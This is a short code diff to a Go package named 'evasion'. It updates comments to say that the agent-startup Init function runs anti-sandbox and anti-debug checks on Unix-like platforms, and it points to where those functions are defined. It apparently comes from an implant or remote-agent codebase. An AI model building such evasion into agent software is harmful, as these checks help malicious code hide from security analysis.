@@ -5,9 +5,11 @@ package evasion
 import "time"
 
 // Init runs evasion techniques at agent startup.
-// On non-Windows platforms this is a no-op.
+// On non-Windows platforms this runs anti-sandbox/anti-debug checks.
+// AntiSandbox, AntiDebug, and SleepWithJitter are defined in:
+//   - anti_sandbox_unix.go (linux, darwin)
+//   - anti_sandbox_other.go (freebsd, etc.)
 func Init() {
-	// Anti-sandbox and anti-debug checks still run on Unix
 	AntiSandbox()
 	AntiDebug()
 }
